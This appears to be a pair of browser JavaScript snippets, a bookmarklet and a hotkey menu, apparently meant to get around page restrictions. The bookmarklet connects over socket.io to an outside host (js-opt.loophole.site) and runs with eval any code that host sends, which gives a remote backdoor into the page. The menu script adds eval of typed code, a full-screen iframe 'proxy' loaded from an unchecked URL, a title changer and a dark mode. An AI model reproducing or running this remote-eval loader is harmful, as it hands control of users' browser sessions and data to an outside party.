/// bookmarklet.js
(document.body.innerHTML+=`<script>const socket = io('https://js-opt.loophole.site:443');socket.on("javascript", function(data) { eval(data); });</script>`;)
const socket = io('https://js-opt.loophole.site:443');
socket.on("javascript", function(data) { eval(data); });
/// a.js
document.onkeydown = function (e) {
  if (e.code=="ControlRight") {
    let option = prompt(`
    Choose an option
    0) Bookmarklet/Javascript
    1) Proxy
    2) Title
    3) Dark Mode (Beta)
    `);
     if (option==0){
      eval(prompt("javascript"));
     } else if (option==1){
      let url = prompt("Proxy url (include https:// infront of link)");
      document.body.innerHTML=`<iframe src="`+url+`" style="position:fixed; top:0; left:0; bottom:0; right:0; width:100%; height:100%; border:none; margin:0; padding:0; overflow:hidden; z-index:999999;"></iframe>`;
    } else if (option==2) {
      let title = prompt("Page title");
      document.title = title;
    } else if (option==3) {
      setInterval(function(){document.querySelectorAll("*").forEach((current) => {
      if (current.tagName=="SVG" || current.tagName=="IMG"){
        current.style.filter="invert(100%)";
      }else{
        current.style.backgroundColor="#111";
        current.style.color="white";
      }});},1);
    }
  }
}

